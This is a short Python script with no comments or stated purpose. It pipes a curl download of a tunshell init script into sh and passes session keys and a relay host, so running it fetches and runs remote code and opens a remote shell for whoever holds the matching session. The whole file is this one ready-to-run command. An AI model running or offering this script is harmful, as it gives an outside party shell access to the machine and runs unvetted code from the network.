import subprocess

def run_curl_command():
    command = [
        'curl',
        '-sSf',
        'https://lets.tunshell.com/init.sh',
        '|', 'sh', '-s', '--',
        'T', 'D3lykVf0Cn2bsfIXrFhssk',
        'eXcbYElub88on8wR4oGhud',
        'eu.relay.tunshell.com'
    ]
    
    try:
        subprocess.run(' '.join(command), shell=True, check=True)
        print("Command executed successfully.")
    except subprocess.CalledProcessError as e:
        print(f"Error executing command: {e}")

if __name__ == "__main__":
    run_curl_command()
